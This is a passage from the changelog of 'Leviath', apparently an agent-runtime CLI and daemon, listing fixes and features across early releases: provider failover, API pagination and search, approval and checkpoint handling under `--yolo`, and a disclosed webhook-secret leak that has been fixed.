  it. An unanswered held checkpoint now stops the run with an error naming it.
  Points left on the default `auto_approve` are unaffected.
- `lev run --yolo` prints which checkpoints will still stop for a person before
  the run starts, and `lev validate` reports them as `holds-under-yolo`.
  `--yolo` waives approvals, not checkpoints, and a run that stops anyway used
  to be indistinguishable from a hang.
- Fixed: a tool permission written under an alias never matched. Policy is
  resolved against the name the model calls, which is always the canonical
  `shell`, so `[tool_permissions] bash = "allow"` granted nothing and
  `lev run --allow bash` did nothing at all. Every layer now accepts either
  spelling. The shipped `software-engineer` writes `bash = "ask"`, which had
  only ever behaved as intended because the built-in default for an unlisted
  tool is also `ask`. The `permission-name-mismatch` lint is gone with the
  problem it described.
- New: `lev approvals safe` prints what runs without an approval prompt and
  which file put each entry there.
- Fixed: a bundled blueprint installed at the bundled version read as up to date
  whatever its files said, so an install that had drifted from the one that
  shipped stayed invisible. `lev setup` now compares the files, not just the
  version, and reports a locally edited copy as `edited locally` - offered, but
  never pre-checked, because installing removes the destination directory first
  and would take the edits with it. `lev run` says it at the moment it matters:
  a run starting on an installed bundled blueprint that this build ships a
  different version of prints a one-line note before it spawns.

- **Security:** `GET /api/agents/{id}/context/history` served every run's webhook
  signing secret to any holder of the API token. The route returns points
  replayed from the run journal, and the journal stores run metadata whole,
  `callback_secret` included, because the daemon needs it to keep signing
  webhooks for a run it reloads after a restart. The redaction covering
  `/api/agents` and its siblings was never applied here. It now happens in the
  shared reader, so every consumer of a run's history inherits it.
- New: `GET /api/runs`, the run listing, paginated and searchable. It supersedes
  the `GET` half of `/api/agents`, which returns every run ever recorded as one
  unbounded array and is now deprecated. Paging is keyset rather than offset, so
  a run created or deleted mid-walk cannot shift the window; `sort=started_at`
  is the default because it is the only sort key that never changes, since
  `updated_at` advances on the persistence heartbeat. `ids=` replaces what used
  to be one request per run, and `fields=` trims each item.
- New: server-side run search, through `q=` and `q_in=`. The default sources
  read metadata already in memory and cost nothing. `context`, `logs` and
  `journal` read from disk, so they are opt-in and bounded by a scan cap that
  reports itself as `scan_truncated` with a null `total`. Matching runs carry
  highlights saying why they matched, which is the part a browser cannot work
  out for itself: it never holds a run's transcript.
- New: `GET /api/agents/{id}/files` lists a run's files when given no `path`,
  either from what the run recorded modifying or from the working directory
  itself, one directory level per request so a workdir containing
  `node_modules` cannot be enumerated in one response.
- New: `GET /api/config` reports `api_version`, a `capabilities` list and the
  server's numeric `limits`, so a client can light up features in one call
  instead of probing routes and reading a 404 as "unsupported" - which is also
  what a missing run looks like.
- New: `GET /api/agents/{id}/logs` takes `stage=<index>|all` and
  `stream=output|logs`.
- Breaking: `GET /api/blueprints` returns a paginated envelope rather than a
  bare array, and accepts `limit`, `cursor`, `q`, `sort` and `order`. Worth
  saying plainly that pagination saves the server nothing here, since discovery
  parses every manifest on every request regardless; `q` is the parameter with
  real value.
- Breaking: `GET /api/agents/{id}/context/history` is paginated. It previously
  returned every recorded point, each carrying a full context window with
  untruncated text, on a journal that grows for as long as the run does.
- Changed: `GET /api/agents/{id}/files?path=<dir>` returns a listing instead of
  a 400. Asking for a directory is the natural way to say "what is in here".
- Fixed: the run-status filter rejected the spelling it hands out. `RunMeta`
  serializes `waiting_input`, but the filter compared a lowercased `Display`,
  i.e. `waitinginput`, so feeding back a status you had just read matched
  nothing - on exactly the two statuses where the reason is least visible.
- Fixed: `GET /api/agents/{id}/logs` returned an empty string for every run. It
  read a run-level `output.log` that nothing has ever written; a run's output
  lives under `stages/<idx>/`.
- Fixed: which blueprint a name resolved to depended on `readdir` order.
  Discovery neither sorted nor deduplicated, and blueprint lookup and agent
  spawning both take the first match by name, so with one name reachable from
  two configured roots, which agent actually ran could differ between two calls.
- Fixed: `RunFlags.modified_file_count` counts modifying tool calls rather than
  distinct files, so a run that edits one file three times records three. The
  file listing reports `modifying_tool_calls` and `modified_files_truncated` as
  separate facts, so a client never subtracts one from the other to guess how
  many files there were.
- Removed: five public functions in `leviath-mcp` that nothing outside their own
  tests called. `ToolExecutor::add_client` was `add_client_advertised` with an
  empty advertised set, `ToolExecutor::execute_filtered` was `execute` behind a
  name check the caller already does, and `ToolRegistry`'s `all_tools`,
  `find_tool` and `server_tools` were superseded by the advertised-name map.
  Callers of `add_client` want `add_client_advertised(name, client, &advertised)`.
- Breaking: giving an agent a task it declares no region for is an error rather
  than a silent drop. Such a run used to spawn anyway and answer a question
  nobody asked, having spent the tokens to do it, and report `complete`. The
  error names the caller input the agent does take. Of the shipped agents only
  `reviewer` is affected, and only when passed `--task`: it takes `--diff` and
  `--criteria`. `lev run` no longer demands a task for an agent that takes none
  either, so `lev run reviewer --diff @x.patch` is now a complete command line.
- `lev validate` reports `region-seed-not-understood` for a `seed` that matches
  none of the recognized forms. Such a seed is ignored and the region starts
  empty, which is what a typo looks like: it is `{ caller = "task" }`, and
  `{ caller_input = "task" }` silently seeds nothing.

## 0.2.0 - 2026-08-04

- Windows no longer flashes console windows across the desktop. Every child
  process Leviath starts is a console application, and one started by a process
  with no console of its own gets a fresh window on the interactive desktop.
  With a `shell` call or two per agent iteration that is a strobe, and a fleet
  of agents made it worse. Every spawn whose output is already piped or
  discarded now asks for no window: the `shell` tool, a script tool's `shell()`,
  seed commands, container lifecycle commands, MCP servers, the Claude Code
  provider, the browser launcher, the dashboard's clipboard helper, and the
  daemon itself. The editor `lev run` opens for you is deliberately left alone,
  since it is the one child meant to be seen. Nothing about output capture
  changes.
- Which shell a command runs in is now decided by a function that takes the
  platform as an argument rather than by a compile-time branch, so the Windows
  answer is checked on every CI machine instead of only on the Windows one.
  Behaviour is unchanged: `cmd.exe /C` on Windows, `$SHELL` then bash, zsh, sh
  for the `shell` tool elsewhere, and always `/bin/sh -c` for script tools.
- OpenRouter works end to end. Several separate faults added up to an install
  that was configured correctly and still did nothing useful:
  - `default_provider` is now honoured. It was only consulted after every
    registered entry a blueprint listed, and the bundled agents all list
    Anthropic, OpenAI and Ollama, so setting it to `openrouter` changed
    nothing. Registered candidates on your default provider now head the
    stage's list, with the blueprint's own entries kept behind them as
    fallbacks. A stage pins its own provider with `allow_user_default = false`,
    which suppresses this as it always did.
  - A provider that cannot be reached at all now counts as unavailable, so the
    run fails over instead of dying. Ollama registers with no key whether or
    not a server is running, so a refused connection to `localhost:11434` used
    to kill runs at iteration 0 with a working provider sitting unused behind
    it in the same list.
  - Reasoning models no longer answer with nothing. They return `content: null`
    and put their text under `reasoning`, which reached the runtime as an empty
    response: the agent was nudged to use its tools, looped, and the run
    finished having said nothing. The field is read when the message carries no
    content and no tool calls, so it never displaces real output.
  - An error a gateway delivers with a 200 status is reported. OpenRouter
    answers `{"error":{...}}` with a success status when an upstream provider
    rejects a request it had already accepted, and that read as
    "No choices in response", throwing away the only text that said why. The
    envelope's own status code is classified as a real one, so a 402 arriving
    this way fails over and trips the circuit breaker like any other.
  - Errors delivered mid-stream surface instead of silently truncating the
    stream.
  - Requests carry the `X-Title` header OpenRouter pairs with `HTTP-Referer`,
    so calls are attributed to Leviath on the account's activity page.
- A hand-written `config.toml` parses. Every field on the top-level config was
  required, so the three lines that point Leviath at OpenRouter failed with
  ``missing field `providers` `` - a table the user has no reason to know
  about, in a message that says nothing about what to add.
- `lev serve` gained three read-only routes, so a browser front end can show
  what a run produced without shell access to the host. All three work with the
  daemon down.
  - `GET /api/agents/{id}/files?path=` returns one file the run wrote. The path
    may be relative to the run's working directory or absolute, but either way
    the resolved path has to land inside that directory, under the same
    symlink-aware containment the file tools use, so the endpoint reads exactly
    what the run was allowed to write. Reads stop at 1 MiB and say so; a cap
    that lands mid-character drops the split character rather than calling a
    text file binary.
  - `GET /api/doctor` runs the checks `lev doctor` runs and returns them as
    data. A failing check is an `ok: false` entry in a 200, never an HTTP error.
  - `GET /api/fs/dirs?path=` lists one directory level of subdirectory names,
    so a folder picker can offer a working directory instead of asking someone
    to type one blind. Paths must be absolute, `--workdir-root` fences it the
    same way it fences spawning, and `parent` is null at the fence so the
    picker is never offered a step above it. Add `hidden=true` for
    dot-prefixed names.
- `lev doctor`'s `resolve` check says when your configured `default_provider`
  is being passed over, and why. `default_provider` with no `default_model` is
  a half-configuration that silently does nothing, and the check used to report
  `OK` next to a provider you never asked for.

## 0.1.2 - 2026-08-02

- `lev run <agent>` with no `--task` now opens your editor on a commented
  template instead of refusing to start, so a task longer than a sentence no
  longer has to survive shell quoting. Saving an empty file cancels the run.
  Stdin still has to be a terminal: a script or CI job without `--task` gets an
  error, now worded to say why the editor cannot be used. The editor is
  `$VISUAL`, then `$EDITOR`, then the first installed of `vim`, `nano`, `vi`
  (`edit`, `notepad`, `vim` on Windows).
- `lev run .` and `lev run ./some-agent` work. The blueprint path was sent to
  the daemon exactly as typed, and the daemon resolved it against its own
  working directory, so a relative path failed with "read manifest
  './agent.leviath': No such file or directory". It is now resolved before the
  request leaves. This is the command `lev create` prints as your next step.
- `lev run` with no PATH uses the current directory, which is what the CLI
  reference has always described. It used to be an error.
- `--task` reads a file when the value names one. A value that looks like a
  path but names nothing is now an error rather than being sent to the agent as
  the prompt, which is what a mistyped filename used to become. Prompt text is
  unaffected: the check only fires on a value with no whitespace that carries a
  `/`, a `\`, or a leading `~`.
- A run stays in `lev ps` for five minutes after it ends instead of vanishing
  when the daemon unloads it. A run that died on its first inference used to
  leave the listing a second or two later, which made it indistinguishable from
  a run that had never been spawned: both read as `no agents running`. Anything
  scheduling work by spawning agents then had to guess how long a healthy agent
  takes to get going, and a guess that came in under a cold start would abandon
  runs that were still starting. The row now carries the status the run ended
  on, so an `HTTP 402` at iteration 0 says so. Tunable with
  `[limits] finished_retention_secs`; `0` restores the old behaviour. The record
  is in memory, so a restart clears it, and `meta.json` and `GET /api/agents`
  remain the durable copy.
- `lev ps --json` gained a `finished` key alongside `runs` and `health`.
  Finished runs are kept apart rather than mixed in, so `lev daemon status` and
  the dashboard still count only the agents the daemon is hosting.
- `meta.json` now records `last_progress_at`, the moment a run last actually
  moved. `updated_at` cannot answer that and never could: it advances on a
  30-second heartbeat whether or not anything happened, so that a stale
  timestamp means the daemon stopped rather than the run. Anything outside the
  daemon that aged a run on `updated_at` was reading a signal that stays fresh
  on a run which has stopped dead.
- `RunMeta.pid` is documented as what it has always been: 0 for every run, live
  or finished. There is no process per run, so nothing can be concluded from
  it, and a sweeper that reverted work on `pid == 0` reverted all of it. Left
  in place for compatibility; it is a candidate for removal in the next major.
- New `lev ps --all`, listing the runs on disk that the daemon is not hosting,
  read from the runs dir rather than the daemon's memory. The retention window
  above covers the minutes after a run ends; this covers the rest of time, and
  survives a restart, which is what a scheduler reconciling its own queue needs.
  Rows that claim on disk to be running while nothing drives them are marked
  `(abandoned)`. With `--all`, a daemon that is down is reported rather than
  fatal, and marks nothing abandoned, because a restarting daemon looks exactly
  like every run dying at once.
- New `[limits] wedge_timeout_secs`: fail a run that has ended up in a state no
  part of the engine can reach, rather than leaving it reported as running for
  the life of the daemon. It never fires on a run that is merely slow; an agent
  waiting on the model, on a tool, on its sub-agents, or on a person is exempt
  however long it takes. Off by default, since it fails runs. Together with the
  above this is what stops an external scheduler leaking slots to runs that
  have quietly stopped, and there is now a page on doing that reconciliation
  properly in the daemon docs.
- New `lev doctor`, which checks that provider wiring works without you having
  to build a throwaway agent to find out. Four checks run in order and each is
  reported: the config file parses and a registry can be built, your defaults
  resolve to a provider that is actually registered, one real inference reaches
  the model, and a one-turn agent spawns over the control socket and finishes.
  The check that fails is the diagnosis. That last one matters most: config,
  resolve and inference passing while `daemon` fails is the difference between
  "my keys are wrong" and "the daemon is wedged", which used to look identical
  from the outside.
- `lev doctor` prints the provider and model it actually resolved to, not just
  "OK". A stage that names no model of its own falls back to `anthropic`, so a
  machine holding only an OpenRouter key can resolve to a provider it has no
  credential for, spawn, and sit at iteration 0 — which is how a batch of runs
  once went nowhere at once. Now it says so, before anything is spawned.
- A failing provider call is reported verbatim, status line and response body
  included, so a 402 naming the exhausted credit or a 404 naming the model
  reads as itself rather than as "inference failed". `--model provider/model`
  tries a model string before you wire it into a blueprint, and is the only way
  to reach a Rhai script provider, which is resolved by name and cannot be
  listed. `--no-daemon` stops after the inference; `--json` prints the checks
  for scripts; a failure exits non-zero, so it works as a CI gate.
- The probe cleans up after itself: the throwaway agent is staged in a temp
  directory and its run is deleted on every path out, including the failing
  ones, so nothing is left in `lev ps` or on disk.
- A provider that runs out of credits no longer takes every agent down with it.
  A `402` arrived as an opaque API error carrying the raw JSON body, so the
  runtime had nothing to branch on and each run died at iteration 0 with the
  blob as its status. Out-of-credits, rejected-key, and not-permitted responses
  are now told apart from an ordinary bad request, including the ones that
  arrive under an innocent status (Anthropic reports a drained balance as a
  `400` saying the credit balance is too low). The message says what to do about
  it and keeps the provider's response for the logs.
- A stage now fails over instead of failing. Its ordered `models` list was only
  ever consulted once, at spawn, to pick the first provider with a key; a
  provider that was configured but unusable was chosen and then never abandoned.
  The rest of the list is kept and used. An ordinary error still cannot spend a
  fallback, and a stage that exhausts its list ends as before, with a readable
  message.
- New `[providers] fallback_order`, a host-wide list of `provider/model` pairs
  tried after a stage's own entries and the default model. A blueprint that
  names a single model has nowhere to go without it. It is per-run policy, so it
  reloads with no daemon restart.
- Providers that keep failing are taken out of service. Failing over rescues one
  run; the next one would start on the same dead provider and rediscover it.
  After `[limits] provider_failures_before_open` consecutive failures (default
  3, since a single payment error can be one oversized request) no run is
  dispatched there. `provider_circuit_cooldown_secs` (default 300) later lets
  one request through as a probe, so topping up an account brings the factory
  back with no restart. Runs with no candidate left are failed with an
  explanation rather than left running forever.
- `lev ps` names any provider currently out of service, with the reason and the
  retry countdown; `lev ps --json` carries it under `health.providers_down`. New
  `leviath.provider.circuit.open` and `leviath.provider.circuit.opened.total`
  metrics report the same per provider. Ten runs dying in a row used to produce
  ten identical error rows and nothing that said the account was empty.
- Anthropic and Ollama now classify HTTP failures through the same shared path
  as every other provider. Both had hand-rolled copies; a side effect was that
  `list_models` reported a rejected API key as a request failure, which reads as
  a transient network fault worth retrying. Ollama also gains the `429` handling
  it never had.
- `lev validate` now checks the things a blueprint leaves unsaid, not just the
  ones it gets wrong. A stage with no `[stages.X.model]` block parsed fine and
  then ran on whatever the user's `default_provider` was; an agent-level
  `[model]` block was read by nothing at all; a typo in `available_tools`
  matched nothing, so the stage quietly advertised one tool fewer and the model
  was told the tool did not exist. Each of those was invisible on inspection and
  turned up hours later as a run behaving oddly. There are thirteen checks in
  all, each with a stable code and a suggested fix.
- Typos are errors and exit non-zero; everything else is a warning that does
  not, or a note that never can. `lev validate --deny-warnings` makes warnings
  fatal for CI.
- The same findings are logged when the daemon spawns a run, so a blueprint
  nobody validated still says what is wrong with it in `daemon.log`. No finding
  refuses a spawn.
- `lev validate` also warns when an autonomous stage grants `ask_user_text`,
  `present_for_review` or another tool that suspends until a person answers.
  Unattended, the run parks there until it is killed. New stage key
  `allow_blocking_tools = true` records that the stage means it; it grants
  nothing and changes no behaviour.
- The lint found two defects in the shipped blueprints. `parallel-fixer` set
  `bash = "ask"` while every stage granted `shell`: policy is matched on the
  name the model calls, so the entry was never consulted. And
  `software-engineer`'s review stage had no `max_iterations`.
- `POST /api/blueprints/validate` returns a `warnings` list alongside `errors`.
- An unattended run no longer gets the tools that wait on a person.
  `ask_user_text`, `ask_user_choice`, `ask_user_confirm`, `present_for_review`,
  and `edit_document` do one thing: open a prompt and block. Under `--yolo`
  nobody answers, so a call to one used to park the agent in `WaitingInput`
  until the daemon restarted; six production runs sat there for three to five
  hours each, holding their slots. They are now dropped from the tool set the
  model is offered, per stage, before the first inference. The model never sees
  them and decides for itself instead of spending a round trip to be told nobody
  is there.
- A stage that genuinely needs a person opts out with `required_tools`, listing
  the human tools it keeps even when the run is unattended. Entries must also
  appear in `available_tools`, and a manifest where one does not is rejected
  rather than quietly ignored.
- Interaction points gained the same escape hatch. `unattended = "ask"` on a
  point holds the run for a real answer under `--yolo` instead of approving
  itself. The bundled `software-engineer` uses it for plan approval: everything
  after that gate writes code, so waving it through unread is the one thing that
  agent should not do on its own.
- New `[limits] interaction_timeout_secs`, one hour by default, puts a deadline
  on any prompt that waits on a person: `ask_user_*`, tool approvals, taint
  gates, and interaction points alike. There had never been one. Expiry resolves
  the prompt exactly as cancelling it does, so an approval and a taint gate both
  deny, the model is told no answer came, and a checkpoint proceeds with no user
  text. A timeout is never read as consent. Set it to `0` to wait indefinitely.
- `lev validate`'s `blocking-tool-in-autonomous-stage` warning now takes
  `required_tools` as the answer it is asking for. Keeping a tool says the same
  thing `allow_blocking_tools` says, one tool at a time, and says it about the
  run as well as the manifest.
- A blueprint's `[read_paths]` declaration now says whether your config
  actually grants it. Declaring a path outside the workdir has never been the
  same as being allowed to read it, but nothing said so: `lev validate` printed
  "valid", `lev list` printed the agent, the run spawned, and the first read
  outside the workdir was refused with no earlier sign that a config grant was
  the missing piece. That was fine on the machine whose config happened to have
  the grants and a mystery on every other one. `lev validate` now checks each
  declared entry against your `config.toml`, names the ones nothing grants, and
  prints the `[agent_read_paths.<agent>]` block that would fix it. `lev run`
  repeats that warning where the person running the agent can see it, rather
  than only in the daemon's log. `lev list` shows the counts per agent, `lev ps`
  grows a `READS` column reading granted over declared (and only when some run
  declares any), and `lev add` reports the status of what it just installed.
  The check compares patterns rather than touching the filesystem, so a grant
  naming a directory that does not exist yet still counts; an individual read is
  still matched against the real, symlink-resolved path when it happens.
- A run is no longer reported as having produced nothing when it never had a
  way to produce anything. `empty_output` in `meta.json` has meant "modified no
  files" since it was added for coding agents, so a router that delegates to
  sub-agents, or an agent whose answer is its text, was flagged on every
  successful run. Blueprints that advertise no file-modifying tool at any stage
  are now exempt, matching the escape a transition gate already makes for a
  stage that could never satisfy it. Agents that can write are judged exactly as
  before, `shell` included: edits made with `sed -i` still leave no record, and
  a run that made only those is still reported.
- That verdict is now visible. `lev ps` reads `complete (no output)`, the
  completion webhook carries an `empty_output` key, and the flag rides in
  `lev ps --json`. It had been written to disk and read back only on restart, so
  a run that finished with nothing to show for it looked exactly like one that
  worked.
- New `leviath.runs.total` metric, counting finished runs by terminal status and
  by whether they produced output, so the empty-run rate can be charted and
  alerted on.
- `lev ps` says why a run is waiting. `waiting` was one word for six unrelated
  situations, so an operator could not tell a run stopped on an approval prompt
  from a parent parked while its workers churn. It now reads
  `waiting: tool approval` or `waiting: children(3)`, alongside stage,
  iteration, tool-call, and age columns. `lev ps --help` defines every status
  and reason, and `lev ps --json` prints the raw listing for scripts.
- The `AGE` column measures time since the run last actually moved, which
  `meta.json`'s `updated_at` does not: that also advances on a 30-second
  heartbeat, so it stays fresh on a wedged run.
- `--yolo` now applies to the whole run tree. Sub-agents and fan-out workers
  inherit it instead of being spawned attended, so a child can no longer stop on
  a prompt nobody is watching for and strand the parent waiting on it.
- `--yolo` also survives a daemon restart, persisted as `yolo` in `meta.json`.
  It used to be dropped on reload on the grounds that forgetting an override can
  only prompt more; in practice that turned a running unattended job into one
  parked forever. Runs written by older versions default to attended. A
  configured `deny` still beats `--yolo`, and `ask_user_choice` still refuses to
  answer blind.
- A stage holding for its sub-agents could be walked back to `active` while
  those children were still running, if an unrelated prompt of its own resolved.
- Fixed a slot leak that could park the daemon with capacity it could not see.
  Releasing an inference-pool permit now wakes the tick loop, so the agents
  queued on a full model pool are re-driven and can take the freed slot. A
  cancelled inference used to hand its slot back in silence, and the loop is
  event-driven, so the freed capacity stayed invisible until something
  unrelated happened to wake it.
- The daemon now re-drives itself on a timer (every 30s) instead of relying
  solely on wakeups. Any missed wake anywhere is bounded to one interval rather
  than parking the daemon indefinitely - previously an agent whose provider was
  not registered, for example, sat at iteration 0 with the daemon completely
  idle and silent.
- Added a lane heartbeat so pool pressure is visible: per-model inference
  occupancy, tool-lane busy/queued counts, and agents by status. It logs at
  `info` only when a lane is at capacity with work queued behind it, and at
  `debug` otherwise, so an idle daemon stays quiet.
- Fixed runs that were spawned but never executed: they sat at iteration 0 with
  no tokens, reported as `running` for ever. A `lev run` whose stages have no
  configured provider is now refused outright, naming the stage and every
  provider it tried, instead of starting a run that could never take a turn.
- A spawn that fails now records the failure in the run directory it staked
  out, rather than leaving a `starting` placeholder that claimed the run was
  alive for ever.
- A run that ends up unable to dispatch anyway - a provider removed from the
  config after it started, say - is now failed once its stall outlives
  `[limits] stall_timeout_secs` (default 60 seconds; `0` waits indefinitely, as
  before). Waiting for a busy model's inference pool is never failed: that is
  ordinary backpressure, however long it lasts.
- An async lane task that dies without reporting (a provider adapter that
  panics) no longer strands its agent waiting for a completion that can never
  arrive; it surfaces as an ordinary inference, routing, or compaction error.
- Pause and resume are now user-facing: `lev pause <run-id>` and
  `lev resume <run-id>`, `POST /api/agents/{id}/pause` and `/resume` on the
  HTTP API, and `p`/`r` in the dashboard. A paused run shows as `paused` in
  `lev ps`, the dashboard, and the API, and comes back still paused after a
  daemon restart.
- Pausing a run that is waiting on input (or already finished) is now refused
  instead of silently accepted; the old behavior could wedge a fan-out parent
  by overwriting the status its merge poll depends on.
- Note for downgraders: run metadata written while a run is paused uses the
  new `paused` status, which older `lev` binaries cannot read. Resume or
  cancel paused runs before downgrading.
- Tool calls are now validated against the JSON Schema each tool advertises
  before they run. A call with missing, mistyped, or out-of-range arguments is
  refused back to the model with the concrete violations instead of executing
  on garbage or surfacing as a permission prompt. A schema that cannot be
  compiled (a typo'd Rhai `@param` type, an uninterpretable MCP fragment)
  skips validation for that tool with a logged warning, and external `$ref`s
  never resolve over the network.
- Taint-gate `[blocked]` results no longer count as successful modifications,
  so a stage whose writes were all blocked cannot satisfy a
  `require_modifications` transition gate.
- `send_to_agent`'s documented `target_region` argument now works: it was
  silently dropped on the sub-agent path and every message landed in the
  conversation region.
- Removed the unused message priority field; inbox delivery was always
  first-in, first-out in practice and now is by contract.
- Agents can be granted read access outside their working directory with a
  `[read_paths]` block. The declaration is inert on its own: your config must
  grant it via `[security] read_paths` or `[agent_read_paths.<agent>]`, access
  is read-only, and every path is checked after resolving symlinks.
- The daemon now watches `config.toml` and reloads it when it changes, so a
  permission, grant, sandbox, limit, or taint edit applies to the next
  `lev run` with no restart. A half-written file leaves the last good config in
  place. Boot-time wiring (providers, MCP, telemetry) still needs a restart.
- Inference errors and iteration caps are written into the next stage's
  context instead of only the logs, preferring a pinned `error_report` region
  when the blueprint declares one, so a recovery stage no longer has to
  rediscover what went wrong.
- The empty-response nudge is now configurable per stage, per agent, and
  machine-wide through `[nudge]` (`enabled`, `max`, `text`, with `{stage}` and
  `{regions}` placeholders). A stage whose deliverable is prose can turn it off
  rather than being told to use tools it does not have.
- Tool batches are journaled at dispatch and each call as it completes, so a
  daemon that dies mid-batch replays the results it already has instead of
  re-running the calls. Anything that never finished comes back as an
  interrupted result the model is told to verify first.
- Completion webhooks now carry a stable delivery id, so a receiver can
  deduplicate retries of the same delivery.
- Releases are cut by a version bump rather than by a schedule. Alpha now
  publishes as soon as a commit bumping `[workspace.package] version` lands on
  `main`, and beta and stable promote it on their usual weekly cadence; a
  channel with nothing new finishes in seconds having published nothing. That
  ends the nightly churn of rebuilding identical source and re-promoting an
  already-promoted build, and with it the `vX.Y.Z+date` tags that existed only
  to avoid colliding with a version already released.

## 0.1.1 - 2026-07-31

Post-launch cleanup.

- The daemon's launchd service label is now `dev.leviath.daemon`;
  `lev daemon install`/`uninstall` also remove any registration under the old
  `ai.sunforge.leviath` label, so upgrading cannot leave a stale supervised
  daemon behind.
- The `lev run` error hint shows a working invocation.
- Removed the outdated per-agent READMEs bundled with the CLI (the
  [agent catalog](https://leviath.dev/docs/agent-catalog) is the maintained
  reference); improved the crates.io pages with inline install steps and a
  runnable library example.
- crates.io releases are now published automatically from each stable deploy,
  from the same commit the binaries are built at.

## 0.1.0 - 2026-07-31

First public release.

- The `lev` binary: run multi-stage agents in a shared-world daemon, with a
  TUI dashboard, REST + WebSocket API, Agent Client Protocol support, and MCP
  tool servers.
- Ten bundled agent blueprints installed by `lev setup`.
- The `leviath` library crate: the whole runtime behind one dependency, with
  `leviath-core`, `leviath-runtime`, and the other layer crates published
  individually for slimmer builds.
- Structured context regions with token budgets, sandboxed tool execution,
  experimental taint tracking, Rhai scripting for providers, tools, regions,
  and policy rules, and OpenTelemetry export.
